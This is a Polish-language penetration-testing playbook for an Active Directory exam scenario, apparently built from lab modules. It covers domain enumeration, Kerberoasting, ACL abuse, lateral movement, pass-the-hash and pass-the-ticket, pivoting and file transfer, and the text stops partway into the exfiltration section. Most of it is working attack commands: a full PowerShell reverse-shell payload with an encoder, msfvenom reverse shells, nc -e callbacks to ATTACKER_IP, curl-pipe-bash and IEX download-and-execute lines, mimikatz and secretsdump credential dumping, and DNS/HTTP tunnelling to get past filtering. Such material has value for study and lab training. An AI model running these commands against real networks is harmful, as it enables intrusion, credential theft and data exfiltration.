> **To jest scenariusz egzaminacyjny AD (40 pkt).** Dostajesz `username:password` zwykłego usera i 3 maszyny (DC + 2 hosty). Cel: pełna dominacja domeny. Poniżej pętla decyzyjna — **nie liniowa lista, tylko cykl**: enumeruj → znajdź prawo/creds → wykorzystaj → z nowego kontekstu enumeruj ponownie. Powtarzaj aż do DA. Sekcje §X.Y odsyłają do szczegółów w tym playbooku.

```bash
# Zmienne robocze (Kali). Ustaw RAZ i używaj wszędzie.
DC=10.10.x.x; DOM=corp.com; DCFQDN=dc01.corp.com
U='jdoe'; P='Password1!'
# ZAWSZE synchronizuj czas z DC — Kerberos rozjeżdża się przy skew >5 min:
sudo ntpdate $DC   ||  sudo rdate -n $DC   ||  faketime "$(sudo net time -S $DC)" bash
# Dopisz do /etc/hosts (Kerberos wymaga nazw, nie IP!):
echo "$DC   $DCFQDN $DOM dc01" | sudo tee -a /etc/hosts
```

### Krok 0 — sanity check: czy creds w ogóle działają
```bash
nxc smb $DC -u "$U" -p "$P"                       # [+] corp.com\jdoe (Pwn3d! = jesteś tam lok. adminem)
nxc smb $DC -u "$U" -p "$P" --shares              # gdzie masz READ/WRITE
nxc ldap $DC -u "$U" -p "$P"                       # potwierdź, że to DC/LDAP odpowiada
```
> ⚠️ **`STATUS_LOGON_FAILURE`** = złe hasło/user. **`STATUS_ACCOUNT_LOCKED_OUT`** = STOP, uważaj ze sprayingiem (lockout policy!). **`KDC_ERR_PREAUTH_FAILED`** przy narzędziach Kerberos = zwykle zły czas → wróć do ntpdate.

### Krok 1 — pełna enumeracja z niskiego konta (fundament wszystkiego)
```bash
# BloodHound zdalnie z Kali (NAJPIERW to — mapa całej domeny w 30 s):
bloodhound-python -u "$U" -p "$P" -d $DOM -dc $DCFQDN -ns $DC -c All --zip
#  → wgraj .zip do BloodHound, oznacz swojego usera 'Mark as Owned',
#    potem: "Shortest Paths to Domain Admins from Owned Principals"
# Masisowa enumeracja obiektów (users/groups/computers/GPO/ACL) — patrz §6.1, §6.2
nxc ldap $DC -u "$U" -p "$P" --users            # wszyscy userzy (+ opisy = częsty jackpot z hasłem!)
nxc ldap $DC -u "$U" -p "$P" --groups
nxc ldap $DC -u "$U" -p "$P" --password-not-required   # konta bez hasła
```
> 💎 **Z hosta domenowego** (gdy masz już RDP/shell na maszynie w domenie): odpal `SharpHound.exe -c All` + PowerView (§6.2) — czasem widać więcej niż zdalnie. Sprawdź `net user /domain`, `net group "Domain Admins" /domain`.

### Krok 2 — szybkie zwycięstwa (zrób WSZYSTKIE, zanim ruszysz dalej)
```bash
# a) AS-REP Roasting — konta bez wymaganego pre-auth → hash offline (§5.3):
impacket-GetNPUsers $DOM/ -usersfile users.txt -dc-ip $DC -no-pass -format hashcat
impacket-GetNPUsers $DOM/"$U":"$P" -dc-ip $DC -request -format hashcat   # z creds = pełna lista
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# b) Kerberoasting — konta z SPN (usługowe) → hash offline (§5.3):
impacket-GetUserSPNs $DOM/"$U":"$P" -dc-ip $DC -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# c) GPP cpassword w SYSVOL — hasło odszyfrowywalne publicznym kluczem (§6.6):
nxc smb $DC -u "$U" -p "$P" -M gpp_password

# d) Password spraying — JEDNO hasło (np. Season2024!) × wielu userów (§5.1):
nxc smb $DC -u users.txt -p 'Autumn2024!' --continue-on-success   # ⚠️ pilnuj lockout!

# e) Sekrety na share'ach do których masz READ (§6.6):
nxc smb $DC -u "$U" -p "$P" -M spider_plus       # albo ręcznie: smbclient // + recurse
```
> 💎 **Priorytet:** hasła w polu `description` userów, GPP cpassword i Kerberoast łamią się najszybciej i często dają od razu skok. Każde złamane hasło → wróć do **Kroku 0** z nowym `$U/$P`.

### Krok 3 — ACL abuse (gdy BloodHound pokazuje ścieżkę bez hasła)
```
BloodHound → node ofiary → prawo nad nim decyduje o technice (§6.5):
  GenericAll / ForceChangePassword  → reset hasła ofiary (nie znasz starego):
      net rpc password "ofiara" "NoweHaslo1!" -U "$DOM"/"$U"%"$P" -S $DC
      (albo: bloodyAD --host $DC -d $DOM -u $U -p $P set password ofiara 'NoweHaslo1!')
  GenericWrite / WriteProperty       → targeted Kerberoast (dopisz SPN, roastuj, cofnij) — czystsze
  WriteDacl                          → dopisz sobie GenericAll → potem reset jak wyżej
  AddMember (nad grupą)              → dodaj się do grupy → aktywują się jej prawa
```
> 💎 Po każdym nadużyciu ACL → **zaloguj się jako ofiara** (Krok 0 z jej creds) i **enumeruj ponownie z jej kontekstu**. To jest ta „pętla", która wynosi Cię coraz wyżej.

### Krok 4 — ruch boczny na host, gdzie masz lokalnego admina
```bash
# Który host? Tam gdzie 'nxc ... (Pwn3d!)' albo user jest w local Administrators.
# Masz hasło → impacket/nxc; masz tylko HASH → Pass-the-Hash (§7.2):
impacket-psexec   $DOM/"$U":"$P"@$TARGET          # SYSTEM shell (§7.1)
impacket-wmiexec  $DOM/"$U":"$P"@$TARGET          # ciszej, bez usługi
nxc smb $TARGET -u "$U" -H "$NTHASH" -x 'whoami'  # PtH
evil-winrm -i $TARGET -u "$U" -p "$P"             # gdy 5985 otwarty (§7.1)
```

### Krok 5 — dump sekretów z przejętego hosta → nowe creds → PĘTLA
```bash
# Na hoscie, gdzie jesteś lokalnym adminem/SYSTEM — wyciągnij co się da (§5.2):
nxc smb $TARGET -u "$U" -p "$P" --sam --lsa       # lokalny SAM + LSA secrets
nxc smb $TARGET -u "$U" -p "$P" -M lsassy         # creds z pamięci LSASS
# Ręcznie na hoscie: mimikatz → sekurlsa::logonpasswords / lsadump::sam
# Każdy nowy hash/hasło/ticket → wróć do Kroku 0/4. Szukaj konta z admincount=1.
```
> 💎 **Cache'owane logowania:** na hoście, na który logował się admin domenowy, LSASS/DPAPI często oddaje jego creds → to zwykle Twój bilet do DC.

### Krok 6 — eskalacja domenowa (finisz)
```bash
# Gdy masz konto z prawem replikacji (DA / Domain Admins / DCSync na domenie):
impacket-secretsdump $DOM/"$daU":"$daP"@$DC -just-dc-user Administrator   # DCSync (§5.6)
impacket-secretsdump $DOM/"$daU":"$daP"@$DC -just-dc                       # cała domena: krbtgt + wszyscy
#   → Administrator:500:...:<NTLM>  krbtgt:502:...:<NTLM>  = koniec gry
# Zaloguj się na DC hashem Administratora (§7.2):
impacket-psexec -hashes :<NTLM_admina> Administrator@$DC

# Ścieżki nietypowe (gdy BloodHound je pokaże):
#  • Backup Operators (SeBackupPrivilege) → zrzuć SAM/SYSTEM/NTDS bez DA (§5.6)
#  • Unconstrained/Constrained/RBCD delegation → nadużycie delegacji Kerberos
#  • AD CS (ESC1-8) → certipy find; podatny szablon = cert dowolnego usera
```

### Krok 7 — potwierdzenie i zbiór dowodów (egzamin!)
```
□ Masz shell jako SYSTEM/Administrator na WSZYSTKICH 3 maszynach AD-setu
□ proof.txt / local.txt zebrane INTERAKTYWNYM shellem: type C:\Users\...\Desktop\*.txt
□ Screenshot: zawartość flagi + ipconfig na tej samej maszynie (§Appendix B)
□ Wpisane w panelu egzaminacyjnym PRZED końcem czasu
□ Golden Ticket (opcjonalnie, persistence): z hashem krbtgt (§5.6) — na wypadek reverta
```

> ### 🧭 Pętla w skrócie (przyklej sobie przed oczy)
> **enum (Krok 1) → quick wins (2) → ACL abuse (3) → lateral (4) → dump creds (5) → z nowym kontekstem wróć do enum.** Wychodzisz z pętli dopiero na DCSync (6). Utknąłeś ≥30 min? → wróć do BloodHound i przejrzyj *inne* ścieżki z Owned; sprawdź, czy przeoczyłeś opis usera / share / SPN.
>
> ⚠️ **Egzamin:** Metasploit/Meterpreter tylko na **JEDNEJ** maszynie w całym egzaminie — **nie pal go w AD-secie** (potrzebny do pivotu i wielu hostów, a MSF pivotu tu nie użyjesz). Trzymaj się impacket/nxc/evil-winrm — legalne i wszędzie.

---

# 7. Lateral Movement (Ruch boczny)

> Cel fazy: z jednego hosta na kolejny, zwykle z pozyskanymi poświadczeniami/hashem.
> **Najpierw** przygotuj payload (§2.4), potem użyj metody uruchomienia zdalnego poniżej.

## 7.1 Zdalne wykonanie z poświadczeniami

> 🎯 **Który mechanizm?** Masz *hasło* local-admina → PsExec / WMI / WinRS. Masz tylko *hash* → PtH (impacket-wmiexec) lub Overpass-the-Hash (§7.2). Cel wymusza *Kerberos* (po nazwie hosta) → Overpass/PtT. WinRM/SMB zablokowane → DCOM (135). **Warunek dla większości: user w grupie Administrators celu** (WinRS wystarczy też *Remote Management Users*).

### Payload: zakoduj reverse shell do base64 (pod WMI/WinRS/DCOM)
> Argumenty z cudzysłowami psują się przy zdalnym wywołaniu — podawaj payload jako `powershell -nop -w hidden -e <base64>`. Listener `nc -lnvp 443` odpal PRZED.
```python
# encode.py — utf16+base64 (strip BOM [2:]); podmień IP/port na swój listener
import base64
p='$c=New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
print("powershell -nop -w hidden -e "+base64.b64encode(p.encode('utf16')[2:]).decode())
```

### PsExec (445/TCP SMB, grupa Administrators)
```cmd
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
> Wymaga: user w lokalnych Administrators celu + share **ADMIN$** + File&Printer Sharing. Zostawia `psexesvc.exe` w `C:\Windows` + tworzy usługę (ślad forensyczny).
### WinRM (5985/5986, grupa Remote Management Users)
```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
Z Linuxa (evil-winrm — mój ulubiony do foothold na AD):
```bash
evil-winrm -i $IP -u Administrator -p 'Mypass123'
evil-winrm -i $IP -u Administrator -H <NTLM_HASH>        # pass-the-hash
```
### sc.exe — usługi zdalne (135/445/139, Administrators)
```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```
> ⚠️ Spacja po `binPath=` i `start=` jest wymagana (składnia sc).

**Pełny łańcuch sc z payloadem (przykład z modułu):**
```bash
# 1. Payload service EXE
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=$LHOST LPORT=4444 -o myservice.exe
# 2. Upload na admin$
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
# 3. Listener (msfconsole: use exploit/multi/handler; set LHOST; exploit)  +  nc -lvnp 4443
# 4. runas z creds na pierwszej maszynie:
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
# 5. Odpal usługę na nowym hoscie:
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

### WMI — najprostsza forma (process call create)
```cmd
:: jednolinijkowiec (wmic, przestarzały ale wszędzie działa); ReturnValue=0 = sukces, zwraca PID
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
:: REVERSE SHELL — payload PowerShella zakodowany base64 (koder §7.1); listener nc -lvnp 443 PRZED:
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e JABjAGwAaQBl...QAoACkA"
```
> RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. `wmic` przestarzały → preferuj PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych.

**WMI reverse shell przez PowerShell (CIM/DCOM — nowoczesny odpowiednik):**
```powershell
$cred = New-Object System.Management.Automation.PSCredential('corp\jen',(ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force))
$Opt  = New-CimSessionOption -Protocol DCOM
$Sess = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
$b64  = "JABjAGwAaQBlAG4AdAA...QAoACkA"     # reverse shell zakodowany (§7.1)
Invoke-CimMethod -CimSession $Sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -nop -w hidden -e $b64"}
# ReturnValue 0 = sukces; złap shell na nc -lvnp 443
```

### WMI + MSI (135/5985, Administrators)
```bash
# 1. Payload MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi > myinstaller.msi
# 2. Upload
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
Na hoscie (PowerShell) — sesja WMI i instalacja:
```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

### impacket (Linux → Windows, jeden z najczęstszych)
```bash
impacket-psexec $DOMAIN/user:password@$IP           # SYSTEM shell
impacket-wmiexec $DOMAIN/user:password@$IP          # cichszy (bez usługi)
impacket-smbexec $DOMAIN/user:password@$IP
impacket-atexec $DOMAIN/user:password@$IP whoami    # przez scheduled task
```

### PowerShell Remoting (5985/5986, wbudowany WinRM z poświadczeniami)
> To wbudowana funkcja WinRM w PowerShellu — wywołujesz `New-PSSession`, podając IP celu i **obiekt poświadczeń** (`PSCredential`). Zbuduj go krok po kroku:
```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
New-PSSession -ComputerName 192.168.50.73 -Credential $credential      # zwraca Id sesji (State: Opened)
Enter-PSSession 1                                                       # wejdź do sesji po Id
whoami; hostname                                                        # weryfikacja w sesji
```
Nieinteraktywnie (jedno polecenie / wiele hostów):
```powershell
$sess = New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Invoke-Command -Session $sess -ScriptBlock { hostname; whoami }
Invoke-Command -ComputerName files04 -Credential $credential -ScriptBlock { whoami }
```
> Wymaga: user w grupie **Administrators** lub **Remote Management Users** na celu. Ten sam `$credential` reużywasz do WMI/CIM (§7.1 wyżej) i winrs.
### winrs (natywny klient WinRM, cmd)
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
:: REVERSE SHELL — wklej zakodowany payload PowerShella (base64 z kodera §7.1); listener nc -lvnp 443 PRZED:
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A...QBlACgAKQA="
```
> `winrs` działa tylko dla userów **domenowych** w grupie Administrators lub Remote Management Users (WinRM 5985/5986). Payload zakoduj koderem z §7.1 (UTF-16LE → base64).
### DCOM (lateral przez 135, gdy WinRM/SMB odpadają)
```powershell
# a) MMC20.Application — wykonaj polecenie zdalnie (bez podawania creds, użyje Twojego tokenu):
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
# 1. Test, że działa (na celu: tasklist | findstr calc):
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
# 2. REVERSE SHELL — dostaw payload base64 (koder §7.1); listener nc -lvnp 443 PRZED:
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-nop -w hidden -e JABjAGwAaQBlAG4...","7")
# b) CIM/DCOM Win32_Process Create (z creds — patrz $cred wyżej):
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -enc <b64>"}
```

## 7.2 Pass-the-Hash / Ticket / Key

### Pass-the-Hash (NTLM)
```
mimikatz
token::revert
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
```
Z Linuxa (format `-hashes LM:NT` — LM wypełnij 32 zerami gdy masz tylko NT):
```bash
xfreerdp /v:$IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
impacket-wmiexec -hashes :NTLM_HASH Administrator@$IP    # ciszej niż psexec (bez usługi/pliku, shell jako user)
impacket-psexec  -hashes :NTLM_HASH DOMAIN/MyUser@$IP    # głośny: usługa + exe na ADMIN$, ale shell SYSTEM
evil-winrm -i $IP -u MyUser -H NTLM_HASH
smbclient \\\\$IP\\secrets -U Administrator --pw-nt-hash <NThash>   # samo CZYTANIE share'a NT hashem
```
> ⚠️ **Dlaczego PtH nie działa (90% przypadków):** **UAC remote restrictions** (default od Visty) blokują zwykłych local-adminów zdalnie — niezawodnie do code-exec działa tylko **wbudowany Administrator (RID 500)**. Konta domenowe działają zawsze (`CORP/Administrator@IP`). Ten sam local-admin password bywa **współdzielony** między hostami → hash z jednego otwiera resztę.

### Overpass-the-Hash (hash NTLM → bilet Kerberos)
> Gdy cel wymusza **Kerberos** (PsExec/usługa po nazwie hosta, nie po IP), a masz tylko hash NTLM. Zamień hash na TGT i uwierzytelniaj się Kerberosem. Wymaga admina lokalnie (odczyt LSASS).
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords          :: wyciągnij hash NTLM ofiary
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
```cmd
:: w NOWYM powershellu (kontekst ofiary):
klist                                   :: na start 0 biletów
net use \\files04                       :: dowolna akcja domenowa WYMUSZA utworzenie TGT+TGS
klist                                   :: teraz widać TGT (krbtgt/CORP.COM) + CIFS TGS
.\PsExec.exe \\files04 cmd              :: PsExec po NAZWIE hosta → Kerberos (po IP wymusiłoby NTLM = fail)
```
> ⚠️ `whoami` w nowym oknie pokaże Twojego pierwotnego usera (token się nie zmienia) — to normalne, liczą się wstrzyknięte bilety. PsExec **nie** przyjmuje hasha → dlatego najpierw robisz bilet.

### Pass-the-Ticket (kradzież cudzego biletu z pamięci)
> Ukradnij TGS/TGT innego zalogowanego usera i wstrzyknij, by wejść tam, gdzie on ma dostęp (np. restricted share). Jeśli bilety należą do Ciebie — admin niepotrzebny.
```
mimikatz
privilege::debug
sekurlsa::tickets /export                :: zrzuca wszystkie bilety do plików .kirbi w bieżącym katalogu
```
```cmd
dir *.kirbi                              :: wybierz bilet w formacie <user>@cifs-<host>.kirbi
```
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
```powershell
klist                                    # potwierdź wstrzyknięty bilet (np. dave cifs/web04)
ls \\web04\backup                        # sprawdź dostęp PRZED i PO (dowód działania)
```
> TGS działa tylko dla jednej usługi/hosta; TGT (~10h) pozwala poprosić o dowolny TGS.

### Pass-the-Key (z ekeys)
```
mimikatz
privilege::debug
sekurlsa::ekeys
```
```
:: RC4
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
:: AES128
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"..."
:: AES256
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"..."
```

## 7.3 RDP hijacking (SYSTEM, Server 2016 i starsze)
> Sesja RDP zamknięta bez wylogowania zostaje otwarta — z SYSTEM przejmiesz ją bez hasła.
```cmd
PsExec64.exe -s cmd.exe                 :: uzyskaj SYSTEM
query user                              :: znajdź sesje (stan Disc = porzucona)
tscon 3 /dest:rdp-tcp#6                 :: przejmij sesję ID 3 na swoją SESSIONNAME
```

---

# 8. Pivoting & Port Forwarding

> Scenariusz w przykładach: `1.1.1.1` = atakujący (SSH server), `2.2.2.2` = PC-1 (pivot, SSH client), `3.3.3.3` = cel wewnętrzny.

> 🎯 **Drogowskaz — co po kolei:** 1) na pivocie `ip addr`+`ip route` → druga karta/podsieć, której Kali nie widzi. 2) loot configów po creds (DB/app). 3) dobierz metodę wg firewalla: **inbound otwarty** → socat / SSH `-L`/`-D` (bind na pivocie); **inbound blokowany, outbound OK** → SSH `-R`/remote-dynamic / Plink (bind na Kali); **Windows** → ssh.exe / Plink / netsh portproxy. 4) postaw tunel → **ZWERYFIKUJ** listener (`ss -ntplu`). 5) skieruj narzędzia na lokalny koniec (`proxychains` dla SOCKS; edytuj `/etc/proxychains4.conf`). 6) enumeruj (`proxychains nmap -sT -Pn -n`), złap kolejny hop, powtórz. 7) **CLEANUP:** ubij tunele, usuń binarki, na Windzie skasuj OBA — portproxy I regułę firewalla.
> 💎 **Co wartościowe:** druga/trzecia karta i CIDR · creds z configów (reuse) · share'y widoczne tylko z wewnątrz · czy pivot ma `socat`/`ssh` (`which`, `where`) · Win-binarki w Kali `/usr/share/windows-resources/binaries/` (nc.exe, plink.exe).

## 8.1 SSH tunneling

Przygotowanie usera do tunelu (na maszynie atakującej):
```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
### Remote Port Forwarding (`-R`) — wystaw port celu na SWOJEJ maszynie
> Na PC-1 (ma dostęp do portu 3389 celu), pchamy go do nas:
```bash
# na PC-1:
ssh tunneluser@ATTACKER_IP -R 3389:SERVER_IP:3389 -N
# u nas:
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```
### Local Port Forwarding (`-L`) — wciągnij port z naszej maszyny na PC-1
```bash
# na PC-1: udostępnij nasz port 80 lokalnie na PC-1
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
# firewall na PC-1 (jeśli trzeba, wymaga admina):
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
### Dynamic Port Forwarding + SOCKS — skanuj całą podsieć przez pivot
```bash
# REVERSE dynamic (-R 9050) — SOCKS na Kali; gdy inbound do pivota blokowany:
ssh tunneluser@1.1.1.1 -R 9050 -N
# LOCAL dynamic (-D) — SOCKS NA pivocie; gdy MASZ konto SSH na pivocie i inbound otwarty:
ssh -N -D 0.0.0.0:9999 db_admin@10.4.50.215
# /etc/proxychains4.conf → socks5 <IP> <port> (obniż tcp_read/connect_time_out); potem:
proxychains smbclient -L //172.16.50.217/ -U hr_admin
sudo proxychains nmap -vvv -sT -Pn -n --top-ports=20 172.16.50.217   # przez SOCKS TYLKO -sT -Pn
```
> `proxychains` działa tylko na **dynamicznie** linkowanych binarkach (nie statyczne). SYN/raw nie przechodzi przez SOCKS → `-sT -Pn`.

### sshuttle — transparentny pseudo-VPN (bez proxychains)
```bash
sshuttle -r db_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24   # potem NORMALNE narzędzia, bez -p/proxychains
```
> Wymaga root na Kali + Python3 na pivocie. Routuje TYLKO podane CIDR. Komunikaty „Failed to flush caches" są nie-fatalne.

### Windows pivot — Plink / netsh portproxy / bundled ssh.exe
```cmd
:: Plink remote-forward (gdy brak OpenSSH; nc.exe/plink.exe w /usr/share/windows-resources/binaries/):
cmd.exe /c echo y | plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
:: netsh portproxy — natywne, zero uploadu (WYMAGA admina; usuń OBA wpisy w cleanup!):
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_WAN> connectport=22 connectaddress=10.4.50.215
netsh advfirewall firewall add rule name="pf2222" protocol=TCP dir=in localport=2222 action=allow
:: nowoczesny Windows MA klienta OpenSSH (od 1803) → remote-dynamic jak w Linuksie:
where ssh & ssh -N -R 9998 kali@KALI_IP
```
> Sam `portproxy` = port „filtered" → MUSISZ dodać regułę `advfirewall allow`. Weryfikacja: `netstat -anp TCP | find "2222"` + `netsh interface portproxy show all`. Cleanup: `netsh ... delete rule` **oraz** `portproxy del` (przeżywają reboot). Confluence loot → hashcat `-m 12001` (`{PKCS5S2}`).

## 8.2 socat (gdy nie ma SSH)
```bash
# Na PC-1: otwórz 3389 i przekieruj na cel
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
# Na PC-1: wystaw nasz port 80 dla celu
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
# firewall (Windows pivot):
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```
> socat nie łączy się bezpośrednio do atakującego jak SSH — otwiera port na pivocie, do którego się dopinasz.

## 8.3 chisel (nowoczesny, gdy socat/SSH odpadają — świetny na Windę)
```bash
# U atakującego (server + reverse):
./chisel server -p 8000 --reverse
# Na pivocie (client) — SOCKS proxy przez tunel:
./chisel client ATTACKER_IP:8000 R:socks
# Potem proxychains jak wyżej (domyślnie socks5 127.0.0.1 1080).
# Pojedynczy port zamiast SOCKS:
./chisel client ATTACKER_IP:8000 R:3389:3.3.3.3:3389
```
> Alternatywa premium: **ligolo-ng** (tworzy interfejs tun, nie potrzebujesz proxychains).

## 8.4 Tunneling przez DPI (gdy filtrują ruch)

> Gdy firewall/DPI przepuszcza tylko HTTP(S) albo DNS — opakuj tunel w dozwolony protokół. Wolniejsze, ale przechodzi.

### chisel przez HTTP (SOCKS w WebSocket)
```bash
# Staging (cel ściąga binarz po HTTP): sudo cp $(which chisel) /var/www/html/ ; sudo systemctl start apache2
# tail -f /var/log/apache2/access.log   ← 'GET /chisel 200' potwierdza pobranie (blind RCE nie ma stdout)
chisel server --port 8080 --reverse                       # Kali (server, reverse)
# Na celu (przez RCE/webshell):
wget ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client ATTACKER_IP:8080 R:socks > /dev/null 2>&1 &
ss -ntplu                                                 # weryfikacja: 127.0.0.1:1080 owner chisel = SOCKS wstał
proxychains nmap -sT 172.16.5.0/24
```
> ⚠️ **GLIBC:** chisel z repo Kali (Go 1.20) pada `GLIBC_2.32 not found` na starym Ubuntu → weź oficjalny **v1.8.1** (Go 1.19) z GitHuba (`chisel -h` pokazuje wersję Go); dopasuj arch (amd64/aarch64).
> **Debug blind-RCE** (client pada po cichu): `... R:socks &> /tmp/output; curl --data @/tmp/output http://ATTACKER_IP:8080/` → body zobaczysz w `sudo tcpdump -nvvvXi tun0 tcp port 8080` (żaden web server niepotrzebny).
### DNS tunneling — dnscat2 (gdy wychodzi tylko DNS)
```bash
# Kali = autorytatywny NS dla kontrolowanej domeny (np. feline.corp):
dnscat2-server feline.corp
# Na celu (klient) — bezpośrednio lub przez lokalny resolver:
./dnscat feline.corp
./dnscat --dns server=ATTACKER_IP,port=53 --secret=<SECRET> feline.corp
# W konsoli serwera:  windows → lista sesji ;  window -i 1 → wejdź ;  potem: shell / exec / listen
# TCP port-forward przez tunel DNS (payoff — przepchnij SMB z głębi sieci):
listen 127.0.0.1:4455 172.16.2.11:445           # [lhost:]lport rhost:rport (bind na hoście NS)
smbclient -p 4455 -L //127.0.0.1 -U hr_admin    # narzędzie celuje w lokalny koniec
```
> **Najpierw UDOWODNIJ drogę DNS:** `sudo dnsmasq -C dnsmasq.conf -d` (`auth-zone=feline.corp`) + `sudo tcpdump -i ens192 udp port 53`, na celu `nslookup x.feline.corp` (NXDOMAIN OK — liczy się, że zapytanie dotarło; `resolvectl flush-caches`). Sesja startuje „ENCRYPTED but NOT VALIDATED" → porównaj auth-string na obu końcach albo `--secret=<KEY>`. **Ubij `dnsmasq` przed `dnscat2-server`** (oba chcą UDP/53). Alternatywa: **iodine**.

### SSH przez łańcuch SOCKS
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.4.50.215
```

---

# 9. Exfiltration & File Transfer

> Cel fazy: przerzucanie plików w obie strony (payload na cel, dane/loot do siebie).

## 9.1 Serwery po stronie atakującego
```bash
python3 -m http.server 8000                          # prosty HTTP (pobieranie z celu)
python3 -m http.server 8000 --bind $LHOST
impacket-smbserver share ./ -smb2support             # SMB share (świetne dla Windy)
impacket-smbserver share ./ -smb2support -user u -password p   # z uwierzytelnieniem
nc -lvnp 4444 > loot.zip                             # odbiór pliku przez netcat
```

## 9.2 Pobieranie na cel — Linux
```bash
wget http://$LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST:8000/linpeas.sh -o /tmp/linpeas.sh
curl http://$LHOST:8000/shell.sh | bash              # bez zapisu na dysk
```

## 9.3 Pobieranie na cel — Windows
```powershell
# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"   # fileless
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/nc.exe','C:\Users\Public\nc.exe')
Invoke-WebRequest http://ATTACKER:8000/nc.exe -OutFile nc.exe
# certutil (LOLBin — działa też jako download)
certutil -urlcache -split -f "http://ATTACKER:8000/payload.exe" C:\Users\Public\payload.exe
# Z SMB share (impacket-smbserver):
copy \\ATTACKER\share\nc.exe C:\Users\Public\nc.exe
```

## 9.4 Bez uploadu — przez tekst (hex/base64)
Gdy masz tylko shell tekstowy — „wypluj" plik i odtwórz u siebie:
```bash
# Na celu:
xxd -p tajny_plik.zip > data.hex
